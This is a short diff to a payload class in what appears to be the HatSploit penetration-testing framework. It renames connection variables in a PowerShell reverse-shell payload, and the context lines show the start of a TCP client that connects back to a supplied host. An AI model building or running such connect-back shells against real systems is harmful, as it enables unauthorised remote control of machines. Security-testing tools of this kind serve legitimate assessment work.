@@ -24,12 +24,12 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        connback_host = self.handler['CBHOST']
-        connback_port = self.handler['CBPORT']
+        remote_host = self.handler['RHOST']
+        remote_port = self.handler['RPORT']
 
         source = (
-            f"$a='{connback_host}';"
-            f"$b={connback_port};"
+            f"$a='{remote_host}';"
+            f"$b={remote_port};"
             ""
             "$c=New-Object system.net.sockets.tcpclient;"
             "$nb=New-Object System.Byte[] $c.ReceiveBufferSize;"
